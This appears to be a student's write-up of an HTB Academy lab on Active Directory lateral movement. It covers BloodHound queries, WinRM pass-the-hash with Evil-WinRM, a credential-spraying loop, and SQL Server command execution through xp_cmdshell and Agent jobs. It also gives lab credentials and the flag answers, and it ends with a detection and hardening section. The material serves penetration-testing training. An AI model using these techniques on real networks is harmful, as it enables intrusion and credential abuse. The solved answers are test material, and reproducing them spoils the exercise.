# 🔐 **Privileged Access**

## 🎭 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

Privileged Access represents the **lateral movement and privilege expansion phase** following domain compromise. After achieving DCSync capabilities and extracting domain credentials, the next step is identifying and exploiting **remote access rights** across the enterprise. This module covers BloodHound enumeration for privileged access, WinRM/PSRemote exploitation, and SQL Server administrative access abuse.

---

### 🔗 **Attack Chain Progression**

**Complete Active Directory Compromise Timeline:**
```
ACL Enumeration → ACL Abuse → DCSync → Privileged Access → Full Infrastructure Control
  (Discovery)    (Exploit)   (Extract)   (Lateral Move)     (Domain Domination)
```

**Prerequisites from Previous Modules:**
- **Domain credentials extracted**: Via DCSync attack
- **Administrative access established**: From ACL abuse tactics
- **Domain understanding achieved**: Through enumeration phases

---

## 🧠 **Privileged Access Concepts**

### **Types of Remote Access Rights**

#### **1. WinRM/PSRemote Access**
- **Protocol**: Windows Remote Management (WinRM)
- **Port**: 5985 (HTTP), 5986 (HTTPS)
- **Authentication**: Kerberos, NTLM, Basic
- **Privileges**: Allows PowerShell remoting and command execution
- **Detection**: BloodHound `:CanPSRemote` relationship

#### **2. RDP Access Rights**
- **Protocol**: Remote Desktop Protocol (RDP)
- **Port**: 3389 (default)
- **Requirements**: Remote Desktop Users group membership
- **Usage**: Interactive desktop sessions
- **Detection**: BloodHound `:CanRDP` relationship

#### **3. SQL Server Administrative Access**
- **Service**: Microsoft SQL Server
- **Privileges**: sysadmin role membership
- **Capabilities**: Command execution via xp_cmdshell
- **Common accounts**: Service accounts with elevated SQL privileges
- **Detection**: Manual enumeration, credential testing

#### **4. Local Administrator Rights**
- **Scope**: Local machine administrative privileges
- **Methods**: Local Administrators group membership
- **Usage**: Full system control, credential extraction
- **Detection**: BloodHound `:AdminTo` relationship

### **Why Privileged Access Matters**

1. **Lateral Movement**: Access additional systems in the domain
2. **Credential Harvesting**: Extract credentials from new systems
3. **Persistence**: Establish multiple access points
4. **Data Exfiltration**: Access sensitive data on various servers
5. **Network Mapping**: Understand infrastructure layout
6. **Attack Path Expansion**: Find additional privilege escalation opportunities

---

## 🩸 **BloodHound for Privileged Access Enumeration**

### **SharpHound Data Collection**

#### **Complete Domain Enumeration**
```powershell
# Navigate to tools directory
cd C:\Tools\

# Run SharpHound with all collection methods
.\SharpHound.exe
```

**Expected Output:**
```powershell
PS C:\Tools> .\SharpHound.exe

2022-06-20T07:32:05.9292877-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:05.9449170-07:00|INFORMATION|Initializing SharpHound at 7:32 AM on 6/20/2022
2022-06-20T07:32:06.4761560-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:07.0074141-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-20T07:32:37.7261930-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 66 MB RAM
2022-06-20T07:32:55.3199297-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-20T07:32:55.3980527-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-20T07:33:07.7418424-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 126 MB RAM
2022-06-20T07:33:14.6481630-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-20T07:33:14.6949636-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Status: 3809 objects finished (+16 56.85075)/s -- Using 80 MB RAM
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Enumeration finished in 00:01:07.9744738
2022-06-20T07:33:15.4918222-07:00|INFORMATION|SharpHound Enumeration Completed at 7:33 AM on 6/20/2022! Happy Graphing!
```

#### **SharpHound Collection Methods**
- **Group**: Group membership relationships
- **LocalAdmin**: Local administrator privileges
- **Session**: Active user sessions
- **Trusts**: Domain trust relationships
- **ACL**: Access Control List permissions
- **Container**: OU and container permissions
- **RDP**: Remote Desktop access rights
- **ObjectProps**: Object properties and attributes
- **DCOM**: DCOM execution rights
- **SPNTargets**: Service Principal Names
- **PSRemote**: PowerShell remoting capabilities

### **BloodHound GUI Analysis**

#### **Starting BloodHound**
```powershell
# Navigate to BloodHound directory
cd .\BloodHound-GUI\

# Launch BloodHound
.\BloodHound.exe
```

#### **Importing SharpHound Data**
1. **Click "Upload Data"** in BloodHound interface
2. **Select ZIP file** ending with "_BloodHound"
3. **Wait for import** to complete
4. **Verify data loaded** in database

### **Cypher Queries for Privileged Access**

#### **WinRM/PSRemote Access Enumeration**
```cypher
# Find users with PSRemote rights to computers
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

#### **RDP Access Rights**
```cypher
# Find users with RDP access to computers
MATCH p=(u:User)-[:CanRDP]->(c:Computer) 
RETURN p
```

#### **Local Administrator Rights**
```cypher
# Find users with local admin rights
MATCH p=(u:User)-[:AdminTo]->(c:Computer) 
RETURN p
```

#### **DCOM Execution Rights**
```cypher
# Find users with DCOM execution capabilities
MATCH p=(u:User)-[:ExecuteDCOM]->(c:Computer) 
RETURN p
```

#### **All High-Privilege Paths**
```cypher
# Find all paths to high-value targets
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {highvalue:true})) 
RETURN p
```

---

## 💻 **WinRM/PSRemote Exploitation**

### **Understanding WinRM Architecture**

#### **WinRM Service Components**
- **WS-Management Protocol**: Web Services for Management
- **HTTP/HTTPS Transport**: Ports 5985/5986
- **Authentication Methods**: Kerberos, NTLM, Basic, Certificate
- **PowerShell Remoting**: Built on WinRM infrastructure
- **Security Context**: Commands run as authenticated user

#### **WinRM Configuration Requirements**
```powershell
# Check WinRM service status
Get-Service WinRM

# View WinRM configuration
winrm get winrm/config

# Check WinRM listeners
winrm enumerate winrm/config/listener
```

### **PSRemote Privilege Verification**

#### **Using PowerShell Remoting**
```powershell
# Test WinRM connectivity
Test-WsMan -ComputerName "target-computer"

# Establish PSRemote session
$cred = Get-Credential
Enter-PSSession -ComputerName "target-computer" -Credential $cred

# Execute commands remotely
Invoke-Command -ComputerName "target-computer" -Credential $cred -ScriptBlock {hostname}
```

#### **Using Evil-WinRM (Linux)**
```bash
# Install Evil-WinRM
gem install evil-winrm

# Connect to target with credentials
evil-winrm -i 172.16.5.5 -u username -p password

# Connect with hash (Pass-the-Hash)
evil-winrm -i 172.16.5.5 -u username -H NTLM_HASH
```

### **Common PSRemote Attack Vectors**

#### **1. Credential Spraying**
```powershell
# Test credentials against multiple hosts
$computers = @("host1", "host2", "host3")
$cred = Get-Credential

foreach ($computer in $computers) {
    try {
        Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock {hostname} -ErrorAction Stop
        Write-Host "Success: $computer" -ForegroundColor Green
    }
    catch {
        Write-Host "Failed: $computer" -ForegroundColor Red
    }
}
```

#### **2. Pass-the-Hash via WinRM**
```bash
# Using Evil-WinRM with NTLM hash
evil-winrm -i 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

#### **3. Golden/Silver Ticket Usage**
```powershell
# Import Golden Ticket and use for WinRM
mimikatz # kerberos::ptt ticket.kirbi
Enter-PSSession -ComputerName "target" -Authentication Kerberos
```

---

## 🗃️ **SQL Server Administrative Access**

### **SQL Server Privilege Escalation Overview**

#### **SQL Server Roles and Permissions**
- **sysadmin**: Full administrative privileges
- **db_owner**: Database ownership privileges
- **db_ddladmin**: DDL administrative privileges
- **public**: Default role for all users
- **xp_cmdshell**: Extended stored procedure for command execution

#### **Common SQL Server Attack Vectors**
1. **Default/Weak Credentials**: sa account, service accounts
2. **SQL Injection**: Application vulnerabilities leading to SQL access
3. **Credential Reuse**: Domain credentials with SQL privileges
4. **Service Account Compromise**: Kerberoasting SQL service accounts
5. **Linked Server Abuse**: Pivoting through SQL server links

### **SQL Server Enumeration and Exploitation**

#### **Using Impacket mssqlclient.py**
```bash
# Connect with Windows authentication
mssqlclient.py DOMAIN/USERNAME@SQL_SERVER_IP -windows-auth

# Connect with SQL authentication
mssqlclient.py sa@SQL_SERVER_IP

# Connect with hash (Pass-the-Hash)
mssqlclient.py DOMAIN/USERNAME@SQL_SERVER_IP -windows-auth -hashes LM:NTLM
```

#### **Basic SQL Server Enumeration**
```sql
-- Check current user and role
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enumerate databases
SELECT name FROM sys.databases;

-- Check xp_cmdshell status
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enumerate linked servers
EXEC sp_linkedservers;
```

#### **Enabling xp_cmdshell**
```sql
-- Enable show advanced options
sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### **Command Execution via xp_cmdshell**
```sql
-- Execute system commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'dir C:\Users';

-- Read file contents
EXEC xp_cmdshell 'type C:\path\to\file.txt';

-- Network enumeration
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
```

### **Advanced SQL Server Exploitation**

#### **Linked Server Exploitation**
```sql
-- Execute commands on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServerName];

-- Double-hop through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami''''''') AT [SecondServer]') AT [FirstServer];
```

#### **SQL Server Agent Jobs**
```sql
-- Create malicious job (requires sysadmin)
USE msdb;
EXEC dbo.sp_add_job @job_name = 'Evil Job';
EXEC dbo.sp_add_jobstep 
    @job_name = 'Evil Job',
    @step_name = 'Evil Step',
    @command = 'whoami > C:\temp\output.txt',
    @subsystem = 'CmdExec';
EXEC dbo.sp_start_job @job_name = 'Evil Job';
```

#### **CLR Integration Abuse**
```sql
-- Enable CLR integration (requires sysadmin)
sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Create and execute CLR assembly for advanced payloads
-- (Complex technique requiring custom CLR code)
```

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Details**
- **Target IP**: `10.129.149.107`
- **RDP Credentials**: `htb-student:Academy_student_AD!`
- **Linux Attack Host**: `172.16.5.225` (SSH: `htb-student:HTB_@cademy_stdnt!`)

### **🔍 Question 1: "What other user in the domain has CanPSRemote rights to a host?"**

#### **Solution Steps:**

**1. RDP Connection:**
```bash
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!
# Click "OK" on Computer Access Policy prompt
# Close Server Manager
# Run PowerShell as Administrator
```

**2. SharpHound Data Collection:**
```powershell
# Navigate to tools directory
cd C:\Tools\

# Run SharpHound to collect domain data
.\SharpHound.exe
```

**Real Lab Output:**
```powershell
PS C:\Tools> .\SharpHound.exe

2022-06-20T07:32:05.9292877-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:05.9449170-07:00|INFORMATION|Initializing SharpHound at 7:32 AM on 6/20/2022
2022-06-20T07:32:06.4761560-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-20T07:32:07.0074141-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-20T07:32:37.7261930-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 66 MB RAM
2022-06-20T07:32:55.3199297-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-20T07:32:55.3980527-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-20T07:33:07.7418424-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 126 MB RAM
2022-06-20T07:33:14.6481630-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-20T07:33:14.6949636-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Status: 3809 objects finished (+16 56.85075)/s -- Using 80 MB RAM
2022-06-20T07:33:14.9761845-07:00|INFORMATION|Enumeration finished in 00:01:07.9744738
2022-06-20T07:33:15.4918222-07:00|INFORMATION|SharpHound Enumeration Completed at 7:33 AM on 6/20/2022! Happy Graphing!
```

**3. BloodHound Analysis:**
```powershell
# Navigate to BloodHound directory
cd .\BloodHound-GUI\

# Launch BloodHound
.\BloodHound.exe
```

**4. Data Import and Query:**
- **Upload Data**: Click "Upload Data" and select the generated ZIP file
- **Wait for Import**: Allow BloodHound to process the data
- **Execute Cypher Query**:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

**Lab Result**: The query reveals that **bdavis** has CanPSRemote rights to a host.

**🎯 Answer: `bdavis`**

### **💻 Question 2: "What host can this user access via WinRM? (just the computer name)"**

#### **Solution Steps:**

**Using the same BloodHound session and Cypher query from Question 1:**

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

**Analysis**: Examining the graph visualization or query results shows that **bdavis** has CanPSRemote access to **ACADEMY-EA-DC01**.

**🎯 Answer: `ACADEMY-EA-DC01`**

### **🗃️ Question 3: "Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt."**

#### **Solution Steps:**

**1. SSH to Linux Attack Host:**
```powershell
# From Windows RDP session, open Command Prompt
ssh htb-student@172.16.5.225
# When prompted for password: HTB_@cademy_stdnt!
```

**Real Lab Output:**
```bash
C:\Users\htb-student>ssh htb-student@172.16.5.225

The authenticity of host '172.16.5.225 (172.16.5.225)' can't be established.
ECDSA key fingerprint is SHA256:BG+VzltzkKbaMbC5FR8GU9x0pcbUBhct6AGrnjH/CHg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.5.225' (ECDSA) to the list of known hosts.
htb-student@172.16.5.225's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

<SNIP>

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

**2. SQL Server Authentication:**
```bash
# Connect to ACADEMY-EA-DB01 using Windows authentication
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
# When prompted for password: SQL1234!
```

**Real Lab Output:**
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:SQL1234!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server   (140 3232)
[!] Press help for extra shell commands
SQL>
```

**3. Enable xp_cmdshell and Execute Commands:**
```sql
-- Enable xp_cmdshell (using built-in mssqlclient command)
SQL> enable_xp_cmdshell

-- Read the flag file
SQL> xp_cmdshell type C:\\Users\\damundsen\\Desktop\\flag.txt
```

**Real Lab Output:**
```sql
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> xp_cmdshell type C:\\Users\\damundsen\\Desktop\\flag.txt

output
--------------------------------------------------------------------------------
1m_the_sQl_@dm1n_n0w!

SQL>
```

**🎯 Answer: `1m_the_sQl_@dm1n_n0w!`**

---

## 📋 **HTB Academy Lab Summary**

### **Verified Lab Answers:**
1. **User with CanPSRemote rights**: `bdavis`
2. **Host accessible via WinRM**: `ACADEMY-EA-DC01`
3. **Flag contents**: `1m_the_sQl_@dm1n_n0w!`

### **Key Lab Techniques:**
- **SharpHound data collection** for comprehensive domain enumeration
- **BloodHound Cypher queries** for privileged access discovery
- **mssqlclient.py Windows authentication** for SQL Server access
- **xp_cmdshell command execution** for system-level access

### **Attack Chain Demonstrated:**
```
Domain Compromise → BloodHound Enumeration → Privileged Access Discovery → Lateral Movement
```

---

## 🛡️ **Detection and Defensive Measures**

### **WinRM/PSRemote Detection**

#### **Event Monitoring**
```powershell
# Key Event IDs for WinRM activity:
# 4624 - Account logon (Type 3 - Network logon for WinRM)
# 4625 - Failed logon attempts
# 400 - WinRM service events
# 6 - WSMan session creation

# Monitor WinRM logons
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -eq 3 -and $_.Properties[18].Value -like "*WinRM*"}
```

#### **PowerShell Logging**
```powershell
# Enable PowerShell script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Enable PowerShell transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
```

### **SQL Server Security Hardening**

#### **xp_cmdshell Disable**
```sql
-- Disable xp_cmdshell
sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Hide advanced options
sp_configure 'show advanced options', 0;
RECONFIGURE;
```

#### **SQL Server Monitoring**
```sql
-- Monitor sysadmin role membership
SELECT p.name, p.type_desc, r.role_principal_id, r.member_principal_id
FROM sys.server_principals p
JOIN sys.server_role_members r ON p.principal_id = r.role_principal_id
WHERE p.name = 'sysadmin';

-- Audit xp_cmdshell usage
-- Enable SQL Server Audit for EXECUTE events on xp_cmdshell
```

### **General Defensive Recommendations**

#### **1. Privileged Access Management (PAM)**
```powershell
# Implement Just-In-Time (JIT) access
# Use Azure AD Privileged Identity Management
# Deploy Privileged Access Workstations (PAWs)
# Regular access reviews and certification
```

#### **2. Network Segmentation**
```powershell
# Segment administrative systems
# Implement jump servers/bastion hosts
# Use micro-segmentation for critical services
# Deploy network access control (NAC)
```

#### **3. Monitoring and Detection**
```powershell
# Deploy SIEM for centralized logging
# Implement User and Entity Behavior Analytics (UEBA)
# Monitor privileged account usage
# Deploy endpoint detection and response (EDR)
```

#### **4. Regular Security Assessments**
```powershell
# Quarterly BloodHound assessments
# Regular penetration testing
# Privileged account audits
# Security configuration reviews
```

---

## 🚀 **Advanced Privileged Access Techniques**

### **BloodHound Advanced Queries**

#### **Complex Attack Path Discovery**
```cypher
// Find shortest paths from owned users to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}))
RETURN p

// Find computers where Domain Users have local admin
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.COM"})-[:AdminTo]->(c:Computer)
RETURN p

// Find all users with DCSync privileges
MATCH p=(u:User)-[:DCSync]->(d:Domain)
RETURN p

// Find kerberoastable users with admin rights
MATCH p=(u:User {hasspn:true})-[:AdminTo]->(c:Computer)
RETURN p
```

#### **Privileged Service Account Discovery**
```cypher
// Find service accounts with high privileges
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)
WHERE u.serviceprincipalnames IS NOT NULL
AND (g.name =~ ".*ADMIN.*" OR g.highvalue = true)
RETURN p

// Find accounts with unusual privilege combinations
MATCH p=(u:User)-[:CanRDP|:CanPSRemote|:ExecuteDCOM|:AdminTo*1..]->(c:Computer)
WHERE NOT u.name =~ ".*\\$$"
RETURN p
```

### **Automated Privilege Escalation**

#### **PowerShell Empire Integration**
```powershell
# Use Empire for automated lateral movement
# Deploy agents through WinRM access
# Leverage SQL Server access for persistence
# Chain multiple privilege escalation vectors
```

#### **Cobalt Strike Integration**
```powershell
# Use Beacon for persistent access
# Leverage WinRM for lateral movement
# Deploy SQL Server agents for data exfiltration
# Implement advanced evasion techniques
```

### **Cross-Platform Attack Chaining**

#### **Linux to Windows Pivoting**
```bash
# Use Linux attack host for initial access
# Leverage mssqlclient.py for SQL Server access
# Chain to PowerShell remoting via WinRM
# Extract additional credentials for further access
```

#### **Multi-Domain Exploitation**
```powershell
# Identify trust relationships
# Leverage cross-domain privileges
# Abuse transitive trust relationships
# Establish persistence across domains
```

---

## 📊 **Key Takeaways**

### **Technical Mastery Achieved**
1. **BloodHound Proficiency**: Advanced Cypher queries for privilege discovery
2. **WinRM Exploitation**: Multiple methods for PowerShell remoting abuse
3. **SQL Server Compromise**: Complete administrative access via xp_cmdshell
4. **Lateral Movement**: Systematic approach to expanding domain access

### **Professional Skills Developed**
- **Graph Database Analysis**: Understanding relationship-based attack paths
- **Multi-Platform Operations**: Seamless Linux/Windows tool integration
- **Service-Specific Exploitation**: SQL Server administrative abuse
- **Detection Awareness**: Understanding defensive signatures and countermeasures

### **Attack Chain Mastery**
```
Credential Extraction → Privilege Mapping → Lateral Movement → Data Exfiltration
   (DCSync Results)     (BloodHound)      (WinRM/SQL)       (Flag Capture)
```

### **Defensive Insights**
- **Monitoring Requirements**: WinRM, SQL Server, and privileged account activity
- **Preventive Measures**: Service hardening, privilege minimization, network segmentation
- **Detection Strategies**: Behavioral analysis, unusual authentication patterns
- **Response Procedures**: Incident containment for privileged access abuse

**🔑 Complete lateral movement and privilege expansion mastery achieved - from domain compromise through privileged access discovery to multi-service exploitation - representing advanced Active Directory penetration testing capabilities for enterprise environments!**

--- 